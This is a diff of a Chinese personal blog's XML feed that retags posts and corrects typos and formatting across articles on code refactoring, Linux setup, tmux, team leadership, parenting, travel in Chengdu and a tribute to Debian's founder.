@@ -891,7 +933,7 @@ volatile变量具有锁的可见性，却不具备原子特性。volatile仅能�
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>c</tag>
         </tags>
         <content type="html"> 案例 下面的代码来自我们某一老产品源码(C语言)中：
 VOS_INT STARTER_Download(VOD_VOID) { VOS_UINT32 count, sleepTimeLen; VOS_CHAR ascExcuteFile[INSTALL_MAX_DIRNAME_LEN]={ 0 }; VOS_BOOL enIsHaveUpdateOk = VOS_FALSE; VOS_INT siRet; BOOTTRACE(TRACE_TIP, &amp;#34;Checking and updating files...&amp;#34;); if(LOAD_Init()==VOS_FALSE) { BOOTTRACE(TRACE_ERR, &amp;#34;The LOAD Init return error&amp;#34;); return VOS_ERR; } siRet=LOAD_Begin(LD_STAGE_INSCHK, &amp;amp;g_downloadFileCount, g_pstFileListInfo, LD_ONLINE_UPDATE); if(siRet != VOS_OK) { LOAD_End(); BOOTTRACE(TRACE_ERR, &amp;#34;The LOAD Begin return error&amp;#34;); return VOS_ERR; } while(VOS_TRUE) { for(count=0;count&amp;lt;g_downloadFileCount;count&#43;&#43;) { if (g_pstFileListInfo[count].enLoadCheckResult == LS_SUCESS_UPDATE ) { enIsHaveUpdateOk = VOS_TRUE; } } for(count=0;count&amp;lt;g_downloadFileCount;count&#43;&#43;) { if (g_pstFileListInfo[count].enLoadCheckResult != LS_SUCESS_UPDATE &amp;amp;&amp;amp; (g_pstFileListInfo[count].enLoadCheckResult != LS_NOT_NEED_UPDATE) &amp;amp;&amp;amp; (g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_NORESPONSE) &amp;amp;&amp;amp; (g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_REFUSE)) { BOOTTRACE(TRACE_ERR, &amp;#34;update file %s error and result=%d&amp;#34;, g_pstFileListInfo[count].acFileName, g_pstFileListInfo[count].enLoadCheckResult); break; } if ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_NORESPONSE) &amp;amp;&amp;amp; (enIsHaveUpdateOk == VOS_TRUE) ) { BOOTTRACE(TRACE_ERR, &amp;#34;Not all files are updated,download these file again&amp;#34;); break; } if ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_REFUSE) &amp;amp;&amp;amp; (enIsHaveUpdateOk == VOS_TRUE) ) { BOOTTRACE(TRACE_ERR, &amp;#34;Not all files version are consistent with inschk,download these file again&amp;#34;); break; } if ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_NORESPONSE) &amp;amp;&amp;amp; (g_pstFileListInfo[count].bLocalCheck = VOS_FALSE) ) { BOOTTRACE(TRACE_ERR, &amp;#34;Fail to connect witch OMU server and local file %s is uncertain, I will still download these files&amp;#34;, g_pstFileListInfo[count].acFileName); break; } if ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_REFUSE) &amp;amp;&amp;amp; (g_pstFileListInfo[count].bLocalCheck = VOS_FALSE) ) { BOOTTRACE(TRACE_ERR, &amp;#34;OMU fesuse to update and %s local check result=%d or some file updated&amp;#34;, g_pstFileListInfo[count].acFileName, g_pstFileListInfo[count].bLocalCheck); break; } if (g_pstFileListInfo[count].ucFileType == PROG_FILE_TYPE ) { siRet = snprintf_s(ascExcuteFile, sizeof(ascExcuteFile), sizeof(ascExcuteFile)-1, &amp;#34;%s/%s&amp;#34;, g_pstFileListInfo[count].acFileExecuteDir, g_pstFileListInfo[count].acFileName); if (siRet &amp;lt;= 0 ) { BOOTTRACE(TRACE_ERR, &amp;#34;[%s:%d] snprintf_s failed,&amp;#34;, __FUNCTION__, __LINE__); break; } (void)chmod(ascExcuteFile, S_IRUSE | S_IXUSR); } } if (count == g_downloadFileCount) { BOOTTRACE(TRACE_TIP, &amp;#34;All %d files checked or updated OK.&amp;#34;, g_downloadFileCount); for(count=0;count&amp;lt;g_downloadFileCount;count&#43;&#43;) { BOOTTRACE(TRACE_LOD, &amp;#34;%d update result is %d and local check result is %d.&amp;#34;, g_pstFileListInfo[count].acFileName, g_pstFileListInfo[count].enLoadCheckResult, g_pstFileListInfo[count].bLocalCheck); } break; } else { if (g_pstFileListInfo[count].enLoadCheckResult == LS_DISK_FULL){ sleepTimeLen=INSTALL_DISK_FULL_AGAIN_TIMELEN; } else { sleepTimeLen=INSTALL_CONNECT_OMU_AGAIN_TIMELEN; } BOOTTRACE(TRACE_ERR, &amp;#34;Update file error so sleep for %d second and try again&amp;#34;, sleepTimeLen); SLEEP(sleepTimeLen); siRet=LOAD_Begin(LD_STAGE_INSCHK, &amp;amp;g_downloadFileCount, g_pstFileListInfo, LD_ONLINE_UPDATE); if(siRet != VOS_OK) { LOAD_End(); BOOTTRACE(TRACE_ERR, &amp;#34;The LOAD Begin return error&amp;#34;); return VOS_ERR; } } } BOOTTRACE(TRACE_DBG, &amp;#34;Exit STARTER_Download&amp;#34;); LOAD_End(); return VOS_OK; } 上面的代码我已是删除了每个条件判断的注释，但是代码看起还是有点长。如果不仔细读，还真不看出不函数完成的功能。再来看优化重构之后的代码：
@@ -916,7 +958,7 @@ SLAP 是 Single Level of Abstraction Principle 的缩写：指定代码块的代
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>python</tag><tag>java</tag><tag>go</tag><tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 案例 下面的代码来自我们某一工具源码(Python语言)中：
 file_gz = gzip.GzipFile(file_name) src_path, src_file = os.path.split(file_name) tmp_file_name = os.path.join(path_name, src_file).strip(&amp;#39;gz&amp;#39;).strip(&amp;#39;.&amp;#39;) tmp_file = open(tmp_file_name, &amp;#39;wb&amp;#39;) tmp_file.writeline(file_gz.realines()) file_gz.close() tmp_file.close() os.remove(file_name) 从代码健壮角度来看，存在如下两个问题：
@@ -1811,8 +1853,8 @@ Schizophrenic Class 紊乱类，一个类本应该一种抽象，完成一类责
         <tags>
           <tag>软件开发</tag>
         </tags>
-        <content type="html"> 忽视的差距 公司推崇工程师文化，提拔一些软件工程师作为标杆没有任何问题。事实上发现很难去标签化软件编码高手的特征。资深软件工程师和新手似乎看起来没啥区别，区别他们是异常困难，尤其这个群体中很多的人不愿意展现自己，他们可能藏在一个领域默默奉献着，不显山不露水。
-软件开发中很多例行却看是平淡的活动，大家都能做到。以产品交付为中心的文化里，人人都是螺丝钉，往往忽然一个人的价值点，很少有人能愿意去了解甚至去分析新手与高手之间的差距。软件开发中专业性总容易被主管们忽视，也因此严重影响了软件工程师追求卓越的过程。曾经发生过可怕的高层观点：精英做架构，资深做设计，随便招个高中生编码就行了。试图把软件产品开发也做成像其它物理产品一样的流水线，这多么年来证明是错误的。
+        <content type="html"> 忽视的差距 事实上发现很难去标签化软件编码高手的特征。资深软件工程师和新手似乎看起来没啥区别，区别他们是异常困难，尤其这个群体中很多的人不愿意展现自己，他们可能藏在一个领域默默奉献着，不显山不露水。
+软件开发中很多例行却看是平淡的活动，大家似乎都能做到。以产品交付为中心的文化里，人人都是螺丝钉，往往忽然一个人的价值点，很少有人能愿意去了解甚至去分析新手与高手之间的差距。软件开发中专业性总容易被主管们忽视，也因此严重影响了软件工程师追求卓越的过程。曾经发生过可怕的高层观点：精英做架构，资深做设计，随便招个高中生编码就行了。试图把软件产品开发也做成像其它物理产品一样的流水线，这多么年来证明是错误的。
 软件工程师中的高手，往往是“上善若水，水善利万物而不争”。他们的专业性看似冰山一角，藏锋敛锐，却在关键时，才会发现他绵绵不绝的力量。这种力量源自他们不断学习的程度，这也是区分高手与普通一种非显性的重要特征。他们大多是持续保持着谦虚，刻苦的学习新知识与技能，向更专业的方向不断地努力。
 软件行业是一个知识更新非常快的行业，而软件高手又常常被现实工作中忽略。大多数人觉得看不到付出得到回报的希望，而是寻找30或35之后其它的出路。逃离似乎成了中国很多程序员的政治正确选择，因而国内少有出现软件界大神级的人物。运动员必须经常锻炼，来保持竞技状态；同样，资深的软件工程师也需要花费更多的时间来维持水平。逆水行舟，不进则退。很多工程师疲于996的工作方式，没有精力与动力去付出更多的时间去学习。
 学习的能力 要想成为高手，就从学习开始。学习能使人进步，则更专业的学习就能使人更快速的成长。学习本身，当然也有高下之别。
@@ -2092,7 +2134,7 @@ https://github.com/actix/actix-web/blob/master/src/handler.rs#L292 impl&amp;lt;T
           <category>笔记</category>
         </categories>
         <tags>
-          <tag>Archlinux</tag><tag>Manjaro</tag>
+          <tag>Linux</tag>
         </tags>
         <content type="html"> 这个周未又在家折腾我的Archlinux，把Archlinux换成了Manjaro，窗口管理采用i3-wm，先上图：
 本文是折腾之后的记录备份，也适合于目前是Archlinux，想把系统转成Manjaro的同学们参考。
@@ -2675,7 +2717,7 @@ Import comments are ignored in vendored packages.
           <category>笔记</category>
         </categories>
         <tags>
-          <tag>Archlinux</tag><tag>WSL</tag>
+          <tag>Linux</tag><tag>WSL</tag>
         </tags>
         <content type="html"> 最近国庆某东活动，搞了一台HP的笔记本，系统是Win10。经过不断地折腾，在Win10上启用了Windows Subsystem for Linux（简称WSL），并在WSL上安装了Archlinux。加入Insider Preview会员计划，可以最快地获取Win10的最新内部版本，以便及时获取WSL的功能更新。
 WSL Windows Subsystem for Linux是一个为在Windows 10上能够原生运行Linux 二进制可执行文件（ELF 格式）的兼容层。 WSL提供了一个微软开发的Linux兼容内核接口（不包含Linux代码）。它包含用户模式和内核模式组件，主要是由如下组成：
@@ -2716,20 +2758,7 @@ WSL终端 windows下命令提示符（cmd），输入bash可以直接进入WSL�
 业务 虽是一个技术团队，所交付是面向客户交付的软件。两个方面是需要思考的：
  价值贡献 满意度  我们常说”质量是我们最后尊严，业务价值是我们存在之本“，道理简洁朗朗上口，但也是最难做好的，做好又是一白遮百丑。
  面向业务：核心竞争力，价值识别与规划 面向业务&amp;amp;解决方案：领域级，变革项目级规划、运作 满意度管理：面向业务（客户，用户）；面向解决方案；面向部门；面向合作伙伴 Top产品，问题的攻关  人 人的运用，对于Leader来说，是一项非常具有挑战的事，这需要Leader有很高的EQ与IQ。总结起来选用育留四个字：
-  选
- 亲自招聘，选择合适的人 已有员工中骨干识别 非关键外包合作    用
-  角色与岗位排兵布阵
-  合作外包
-  育
-  能力引入：公司内部交流：经验总结交流分享；部门内外专家交流；业界交流：参加相关技术峰会；高级顾问培训交流
-  能力培养：提升人员技能；组织能力建设
-  全程关注：事前辅导，事中监控，事后总结
-  留
-  绩效辅导
-  即时激励
-  组织氛围：员工座谈，组织集体活动，员工关怀（问题员工识别管理，异常事件处理）
-  岗位流动
-  事 以前作为一个团队的小Leader，感觉一天都在忙，但不知在忙些什么。管事恨不得像孙猴子能分身出来，但健身乏术，如何正确合理地授权也是考验Lader的水平。
+ 选  亲自招聘，选择合适的人 已有员工中骨干识别 非关键外包合作   用  角色与岗位排兵布阵 合作外包   育  能力引入：公司内部交流：经验总结交流分享；部门内外专家交流；业界交流：参加相关技术峰会；高级顾问培训交流 能力培养：提升人员技能；组织能力建设 全程关注：事前辅导，事中监控，事后总结   留  绩效辅导 即时激励 组织氛围：员工座谈，组织集体活动，员工关怀（问题员工识别管理，异常事件处理） 岗位流动    事 以前作为一个团队的小Leader，感觉一天都在忙，但不知在忙些什么。管事恨不得像孙猴子能分身出来，但健身乏术，如何正确合理地授权也是考验Lader的水平。
  TopN问题与任务跟踪管理 KPI管理：现状问题分析；改进计划（包括措施）；改进监控；达成评估 风险管理 技术持续改进：新技术引入；优秀实践； 质量持续改进：质量文化；质量监控，问题日清日结；质量回溯；质量改进 流程运作持续改进 知识管理 跨部门协同 </content>
     </entry>
     
@@ -2829,19 +2858,7 @@ GitHub地址：https://github.com/xtfly/xvim
 爸爸妈妈永远是孩子最重要的人，哪怕这个世界真的有一所完美的幼儿园，也永远不要把所有责任都扔给幼儿园。毕竟，对爸爸妈妈来说，自己的孩子独一无二，对孩子来说，自己的爸爸妈妈也独一无二。
 孩子上幼儿园并不是不需要再管孩子，而是更需要花更多的时间去侧面了解孩子，关心孩子，教育孩子。幼儿园是一个小社会，不同的小朋友来自不同的家庭。不同的家庭，有不同的价值观，不同的思维，不同的生活习惯。这些都会影响孩子的性格成长，生活习性。所以也需要家长投入更多的精力来关注孩子的成长。
 家长如何做 小孩上幼儿园，小孩突然完全脱离了自己的控制，这尤其是对家长的一种考验。孩子的成长也需要家长一起成长，那家长如何做呢？总结起来，有五要，有五不要：
-  五要：
-  走路回家
-  保持平静
-  分享快乐
-  主动沟通
-  积极配合
-  五不要：
-  甜水等待
-  刨根问底
-  迁就放纵
-  零食补偿
-  偏信偏听
-  </content>
+ 五要：  走路回家 保持平静 分享快乐 主动沟通 积极配合   五不要：  甜水等待 刨根问底 迁就放纵 零食补偿 偏信偏听    </content>
     </entry>
     
      <entry>
@@ -3301,7 +3318,7 @@ func (mux *ServeMux) Handle(pattern string, handler Handler) func (mux *ServeMux
           <category>笔记</category>
         </categories>
         <tags>
-          <tag>Archlinux</tag><tag>Docker</tag>
+          <tag>Linux</tag><tag>Docker</tag>
         </tags>
         <content type="html"> 想在Mac本上使用Docker来运行Archlinux，家里安装的是长城宽带，无奈从docker hub下载Archlinux基础Image网速无法忍受。在国内的alauda.cn镜像中心搜索到有Archlinux基础Image，可能由于在Docker使用Archlinux国内人比较少，估计alauda.cn的CDN也没有缓存Archlinux基础Image，下载同样也是龟速，下载多次超时就放弃了。
 正好个人还有一台老的笔记本安装了Archlinux，那何不自己做一个基础Image。说真的，还没有从零开始做过基础Image。在Docker hub搜索时发现有一个已有的脚本mkimage-arch.sh，于是把它做了些改造，制作过程记录一下：
@@ -3339,7 +3356,7 @@ func (mux *ServeMux) Handle(pattern string, handler Handler) func (mux *ServeMux
           <category>笔记</category>
         </categories>
         <tags>
-          <tag>Archlinux</tag><tag>Win10</tag><tag>grub2</tag>
+          <tag>Linux</tag><tag>Win10</tag><tag>grub2</tag>
         </tags>
         <content type="html"> 个人有两台笔记本电脑，一台Sony安装Win10，平时给岳父上上网，自己使用比较少；另一台是MBA，自己在捣腾点代码，写点东西。今天心血来潮，想体验一个KDE的plasma 5，于是又来折腾Sony安装双系统。由于在使用MBA之前，也在Sony上安装过Archlinux，不过后来安装Win10，又把Archlinux删除了。这次的双系统，Linux还是选择Archlinux。
 安装Archlinux按照Wiki一路下来很顺利，最后安装plasma，使用了一下，感觉也不够如此，可能是使用Mac OSX时间长了的原因。后面发现想回到Win10，发现Grub默认没有生成Win10的引导菜单。
@@ -3392,7 +3409,7 @@ func (mux *ServeMux) Handle(pattern string, handler Handler) func (mux *ServeMux
           <category>笔记</category>
         </categories>
         <tags>
-          <tag>Mac</tag><tag>Shell</tag>
+          <tag>MacOS</tag><tag>Shell</tag>
         </tags>
         <content type="html"> 什么是tmux tmux是一个支持多会话独立运行的优秀的终端复用软件。它类似GNU Screen，自于OpenBSD，采用BSD授权。使用它最直观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪费”多余的终端来连接这台远程主机。
 tmux的使用场景 Mac自带的Iterm2很好用啊。既支持多标签，也支持窗体内部Panel的分割，为什么还要用tmux？
@@ -3436,17 +3453,12 @@ set -g prefix ^k unbind ^b  默认的tmux风格比较朴素甚至有些丑陋。
         <tags>
           <tag>软件开发</tag>
         </tags>
-        <content type="html"> 最近在走读团队的代码，有时实在是看不下去。不是因为他们的代码编写有很多Bugs，而是没有设计实现太复杂了。当面对众多的需求需要快速实现，没有几个人会去思考代码怎么写结构才更合理，而是在不断去搬砖垒需求。当我去咨询他们为什么要这样实现时，每个人能只能说出一，不知其二。即使自己写的代码，也不知道当初为什么这么实现。
-同时，我们团队中不乏有各种兴趣小组。例如学习新的技术框架，交流设计模型，讨论重构技巧、性能优化经验。而实际在操作层面上，代码却正如前面所讲，有时真的不堪入目。由于这近在看王阳明传，突然想到我们没有知行合一啊。
-知 ：一方面是我们对技能掌握，如程序语言知识，设计模式，框架类库等；另一面是我们对需求理解，如场景梳理，用例分析，关键指标等。 行 ：能根据掌握的知识技能，以及对需求的认识应用于项目中，能过代码转化为实际客户所需的产品。
-结合按王阳明的学说，做为一名合理的软件工程师，则需要格物致知，知行合一，良知和致良知。
+        <content type="html"> 最近在走读团队的代码，有时实在是看不下去。不是因为他们的代码编写有很多Bugs，而是没有设计实现太复杂了。当面对众多的需求需要快速实现，没有几个人会去思考代码怎么写结构才更合理，而是在不断去搬砖垒需求。当我去咨询他们为什么要这样实现时，每个人能只能说出其一，不知其二。即使自己写的代码，也不知道当初为什么这么实现。
+同时，我们团队中不乏有各种兴趣小组。例如学习新的技术框架，交流设计模式，讨论重构技巧、性能优化经验。而实际在操作层面上，代码却正如前面所讲，有时真的不堪入目。正好这近在看王阳明传，突然想到我们没有知行合一啊。
+ 知 ：一方面是我们对技能掌握，如程序语言知识，设计模式，框架类库等；另一面是我们对需求理解，如场景梳理，用例分析，关键指标等。 行 ：能根据掌握的知识技能，以及对需求的认识应用于项目中，通过代码转化为实际客户所需要的产品。  结合按王阳明的学说，做为一名合理的软件工程师，则需要格物致知，知行合一，良知和致良知。
   格物致知 ：
-  格需求。对需求不断地格，才能知道客户真正需要什么。因为客户的提出需求时，往往是感性的，非技术化的描述，也可能是模糊不清晰的。那就需要我们不断去交流与探讨，才能明白客户的痛点，进而知行合一，指导你编码，做出满足客户真正需要的东西。
-  格技术。软件开发会涉及到很多的知识，尤其是大型的项目。我们面对操作系统，各种框架程序，以及各种软件工程方法。我们需要不断地格，去深入探本究源，明白什么场景下，使用什么技术是最优的。
-  知行合一 ：
-  知而为行。知行合一很好理解了，简单的就是“知”和“行”统一。理论与实践想结合，一切的实践行动又必须有理论支撑。所想即所写，所写即所需。你能编写出来的代码才是真正知道的需求，你真正知道的需求你就一定能编写出来代码。
-  行而促知。我们不断地学习与交流，本身没有什么问题。其实如果没有实践的切身体验，是难以有较深的认知的。往往是学完也说不出一个所以然。知行合一，学习必须时刻结合实践行动，这样才能真正的掌握并不断的进步。
-  良知和致良知 ：
+ 格需求。对需求不断地格，才能知道客户真正需要什么。因为客户的提出需求时，往往是感性的，非技术化的描述，也可能是模糊不清晰的。那就需要我们不断去交流与探讨，才能明白客户的痛点，进而知行合一，指导你编码，做出满足客户真正需要的东西。 格技术。软件开发会涉及到很多的知识，尤其是大型的项目。我们面对操作系统，各种框架程序，以及各种软件工程方法。我们需要不断地格，去深入探本究源，明白什么场景下，使用什么技术是最优的。    知行合一 ：
+ 知而为行。知行合一很好理解了，简单的就是“知”和“行”统一。理论与实践想结合，一切的实践行动又必须有理论支撑。所想即所写，所写即所需。你能编写出来的代码才是真正知道的需求，你真正知道的需求你就一定能编写出来代码。 行而促知。我们不断地学习与交流，本身没有什么问题。其实如果没有实践的切身体验，是难以有较深的认知的。往往是学完也说不出一个所以然。知行合一，学习必须时刻结合实践行动，这样才能真正的掌握并不断的进步。    良知和致良知 ：
  良知。良知是人内心深处的心声。软件开发的良知是程序员做事的标准。显然，不断地只按需求去垒代码不是标准，能跑起来的代码也不是标准。软件开发的标准可能很多，不同的人有不同的看法。但一个团队一定要代码编写标准化，开发流程标准化。没有规矩成不了方园，标准化才能提高我们的效率。 致良知。找到标准（良知），然后去做到知行合一（致良知）。如果程序的良知是优秀的代码，那致良知就是我们不断地为实现优秀的代码去努力。优秀的代码涵盖代码的可读性，可理解性，同时还需要兼顾代码的可扩展性，可维护性。不要对自己编写的代码放任不理，识别代码的坏味道，编程的过程实际是一个不断重构改进的过程。古人说“三日省吾身”，编程也需要不断地反思。   </content>
     </entry>
     
@@ -3588,7 +3600,7 @@ Docker开放网络与卷管理扩展能力，可能是出于建立生态考虑�
 在大望艺术小镇内，七拐八拐才找到她，她仿如世外桃园，不与商业争艳。这不是一家普通的店，而是一家颇具文艺气息的休闲别院。店有一个非常诗意的名字：七秒时光。当我们推开门，经过一段门廊，映入我们眼帘是一座极具风情的别院：树，小溪，茶亭，书，钟表，留声机。一切充满了文艺，轻松的气息。而正门墙上的一段文字也深深地吸引了我：
  这也是我的天涯。进，看不见幸福，退，看不见你。止于此。春便还是春，夏便还是夏。爱止于此，心也止于此，风止于秋水，我止于你。
  店名的也是别具深意，在这个繁华的世界，你我学会放下烦恼，只要拥有你，便能止于此：
- 传说鱼的记忆只有七秒 七秒一过，它们就会忘记所发生的事情,每一刻都是崭新的，一点也不会疲惫，这样快乐总有理由&amp;hellip;
+ 传说鱼的记忆只有七秒，七秒一过，它们就会忘记所发生的事情,每一刻都是崭新的，一点也不会疲惫，这样快乐总有理由&amp;hellip;
  是的，我们的痛苦，大多是来自我们虚无空洞的追求。愿做一条七秒鱼，安顿身心，把每一刻活出崭新。这或许是2016年元旦最大的收获。
  推荐阅读：我是一条只有七秒记忆的鱼
 </content>
@@ -3604,9 +3616,9 @@ Docker开放网络与卷管理扩展能力，可能是出于建立生态考虑�
           <tag>总结</tag>
         </tags>
         <content type="html"> 韶华易逝，往昔不再。时间已翻到2016年，在15年的12月份，忽然做了一个决定，注册了lanlingzi.cn这个域名，开始鼓励自己写写东西。原由是在15年的下半年，工作上做一个重大的调整，暮然发现自已写东西有时真让人费解。这个域名上已有的文章，是我之前在CSDN上一些记忆，以及自已电脑上留下的文档。虽然在公司也会写写技术博文，但那些更倾向于技术的细节与程序语言，对问题的思考与见解少了一些。
-在16年的计划目标是每个月一到两篇，争取多写些有思想，有见解的干货。经过这几天的梳理，才有了这个网站。发现写东西是一个比较费时费脑力的事儿，甚至比写起代码来还难。苦于自己的文思，文笔，写完之后，有时连自己都看不下去，一堆的错别字，语句不通顺。有时，脑子中是飞快地转，好似有千言万语，下笔时却不知从何写起。
+在16年的计划目标是每个月一到两篇，争取多写些有思想，有见解的干货。经过这几天的梳理，才有了这个网站。写东西是一个比较费时费脑力的事儿，甚至比写代码来还难。苦于自己的文笔，写完之后，有时连自己都看不下去，一堆的错别字，语句不通顺。有时，脑子中是飞快地转，好似有千言万语，下笔时却不知从何写起。
 不管怎么样，我已经开始写了，我也开始享受写作的过程，整理文字，就是整理自己的思绪。可以把零星的，模糊的想法，通过这个网络串起来，记录下来。我不求有人会去欣赏，孤芳自赏也是一种自娱。也许，每每自己回头阅读自己的文字，也是阅读自己的回忆。有会也许会觉得自己一些想法，见解，观点是那么的幼稚、怪诞，可笑。这或许也是自我的一种成长历程吧。
-16年不再年轻，而技术却是日新月异，既然今年放弃了带团队，专走技术这一线，那就坚持吧。16年加油，技术不会随着年轮越走越窄，无论是编写代码，还是做设计方案，只要能沉下心来，专心专意去付出，就会又有收获。
+16年不再年轻，而技术却是日新月异，既然今年放弃了带团队走管理，专走技术这一线，那就坚持吧。16年加油，技术不会随着年轮越走越窄，无论是编写代码，还是做设计方案，只要能沉下心来，专心专意去付出，就会又有收获。
 15年在思想上虽有一些波折，但整体还是圆满，要感谢的人太多太多。感谢家人的理解与支持，感谢领导与同事的器重，感谢大家的宽容与谅解。那些往事，那些经历，一路上有你们的支持，才能有我每年的成长。学会感恩，让自己的内心更加的平静，更加的强大。
  16年加油，让生活更美好！
 </content>
@@ -3621,7 +3633,7 @@ Docker开放网络与卷管理扩展能力，可能是出于建立生态考虑�
         <tags>
           <tag>Linux</tag><tag>Debian</tag>
         </tags>
-        <content type="html"> 万万没想到，在即将迎来2016年时，微信，科技新闻中都在传“Debian创始人Ian Murdock离奇死亡，曾发推表示要自杀”。作为一个对Debian系Linux的忠实爱好者，有种莫名的感伤，对大神的离去表示衷心的哀悼。
+        <content type="html"> 万万没想到，在即将迎来2016年时，微信科技新闻中都在转发 “Debian创始人Ian Murdock离奇死亡，曾发推表示要自杀”。作为一个对Debian系Linux的忠实爱好者，有种莫名的感伤，对大神的离去表示衷心的哀悼。
 30日Debian社区正式发表了悼念声明如下：
  我们怀着沉重地心情哀悼刚刚离我们而去的 Ian Murdock，开源软件的坚定支持者，父亲，儿子，和 Debian 中的 &amp;ldquo;ian&amp;rdquo;。
 Ian 从 1993 年8 月开始启动 Debian 项目，并在同一年的稍晚时间正式发布了它的第一个版本，Debian 还会一直坚定不移地继续努力，成为流行世界、亿万人受惠的通用操作系统，不管是嵌入式设备还是太空站，都能看到它的身影。
@@ -3629,10 +3641,10 @@ Ian 一直非常关注在创建一个发行版和开源社区文化的过程中�
 Ian 对开源的忠诚奉献一直引导着他的工作，不管是在 Debian 还是在后来的年月里，一直伴随他朝着最好的未来。Ian 的梦想一直都在发扬和纪旭，Debian 社区仍然非常活跃，成千上万的开发者们用数不清的工作时间带给世界一个安全可靠的操作系统。
 这段特殊时期，Debian 社区的精神会一直陪伴着 Ian 的家庭，会陪伴一起共度难关。
 他的家庭同时也请求大家在这个艰难的时刻留给他们一些隐私空间，我们对此非常尊重，同时也号召大家尊重 Ian 家人的愿望，来自 Debian 社区和开源社区的关心他的人们的慰问，可以发送到这个专属邮箱，Debian 社区会保存这份善意，并存档。
- Debian的诞生本来就是一件很浪费的事，理想主义，追求纯粹，不包含非自由软件，充满激情，同也是非常的沉稳。Debian也是目前Linux发行版本中，最为彻底，最为忠实，践行开源精神的版本。它曾经是一个符号，一面旗帜。
+ Debian的诞生本来就是一件很浪费的事，充满理想主义。它追求纯粹，不包含非自由软件，充满激情，同也是非常的沉稳。Debian也是目前Linux发行版本中，最为彻底，最为忠实，践行开源精神的版本。它曾经是一个符号，一面旗帜。
 Debian的名称也据说来源一个美丽的爱情故事（Deb来自于前女友Debra，Ian来自他自己的名字），Ian长期担任Linux基金会的首席技术官，他的成就在自由软件，开源社区是一个了不起的传说。
 逝者已往，愿Ian安息，这位把自己的浪漫书写在了Debian和OpenSource的传奇人物，一路走好，我们会永远记住您！
-他能在软件开源这个虚拟世界中，一呼百应呼风唤雨，但在现实世界也是一个普通人。作为一名程序员，或许不经意的创作，能改变世界科技的发展。开源摧动了技术的发展，使得知识更容易获取，使得技术更容易创新。但他们却可能不是这个过程中最大的获利者。在虚拟的技术世界中，我们敬奉他们为大神，而在现实世界中，很少有人能获得像政要，企业家的社会地位，甚至不如某国一名歌坛明星。即使面对一名小警察，或许只能通过自杀来表达诉求或无奈。
+他能在软件开源这个虚拟世界中，一呼百应呼风唤雨，但在现实世界也是一个普通人。作为一名程序员，或许不经意的创作，能改变世界科技的发展。开源摧动了技术的发展，使得知识更容易获取，使得技术更容易创新。但他们却可能不是这个过程中最大的获利者。在虚拟的技术世界中，我们敬奉他们为大神，而在现实世界中，很少有人能获得像政要、企业家的社会地位，甚至不如某国一名歌坛明星。即使面对一名小警察，或许只能通过自杀来表达诉求或无奈。
 </content>
     </entry>
     
@@ -3733,10 +3745,10 @@ Mesos与K8S Mesos与K8S都起源于Borg，Mesos和K8S的愿景差不多，但是
           <tag>成都</tag>
         </tags>
         <content type="html"> 风味十足的四川话，风姿卓然的川妹子，麻辣干香的风味菜，是我是对成都的初步映象。有“天府之国”、“蜀中苏杭”美誉的成都蓉城，在小说与故事中都有耳闻，向往已久。在上高中时，就想报考虑成都的高校，无奈分数不够高，被调济到北方。这次作为招聘技术面试官出差来了一趟成都，了却了一桩十几年前的心愿。
-作为面试官，我们必须西装革履，多年的散慢习惯，反而不太适当。我们下榻的酒店，环境与生活还算不错，但是地理位置有点偏，即使晚上空闲下来，也难以感受到成都的气息。招聘其实是个苦差事，连续二天集中的面试时间，已让我有些疲倦。第三天中午面试完最后几个之后，下午忽然空闲下来。秘书说下午面试预约已结束，我们几个来自深圳的同事可以去成都逛逛。
-背上背包，一路朝南，寻找成都的古迹。步行街、杜甫草堂、武侯祠，锦里古街，古香古色，即使仿古，也别有风味。在锦里，见到是当地老头老太，倒上一怀茶，四个人摆起麻将旧，忘记的游人带给这个城市的喧嚣。深深的巷子里，不管是一条宽的还是一条窄的，人们总是贪恋的过着闲趣的生活。而我也妄想在某个旧的巷子里头，旧的墙砖缝里，寻找历史的一点蛛丝马迹。
+作为面试官，我们必须西装革履，多年的散慢习惯，反而不太适合。我们下榻的酒店，环境与生活还算不错，但是地理位置有点偏，即使晚上空闲下来，也难以感受到成都的气息。招聘其实是个苦差事，连续二天集中的面试时间，已让我有些疲倦。第三天中午面试完最后几个之后，下午忽然空闲下来。秘书说下午面试预约已结束，我们几个来自深圳的同事可以去成都逛逛。
+背上背包，一路朝南，寻找成都的古迹。步行街、杜甫草堂、武侯祠，锦里古街，古香古色，即使仿古，也别有风味。在锦里，见到是当地老头老太，倒上一怀茶，四个人摆起麻将桌，忘记游人带给这个城市的喧嚣。深深的巷子里，不管是一条宽的还是一条窄的，人们总是贪恋过着闲趣的生活。而我也妄想在某个旧的巷子里头，旧的墙砖缝里，寻找历史的一点蛛丝马迹。
 人最大的享受之一就是吃喝。来到成都，自然少不了品尝一下当地的小吃美食。“棒棒鸡”、“怪味兔”、“张飞牛肉”，总是映入到你的眼帘，从一品天下，到锦里古街，还是秘书安排的晚宴，我觉得我想吃的东西太多，但发现只要吃上一种，就有种会上瘾的感觉。即使我带回给儿子的牛皮糖，他也是爱吃得不了。
-成都的生活的确是安逸的，哪怕是现在。它始终是一个生活的好地方。也始终是令人憧憬或向往的。回到深圳，望着车流川息，感觉是从一个世界到另一个世界，快节奏的生活，超熬贵的房价，让我们无法去轻触着这个城市的生活轨迹。
+成都的生活的确是安逸的，哪怕是现在。它始终是一个适合生活的好地方，也始终是令人憧憬或向往的。回到深圳，望着车流川息，感觉是从一个世界到另一个世界，快节奏的生活，超贵的房价，让我们无法去轻触着这个城市的生活轨迹。
 </content>
     </entry>
     
@@ -4117,7 +4129,7 @@ void setBoolean (Field f, Object a, final boolean value) { ／／插入检查obj
           <tag>宗教</tag>
         </tags>
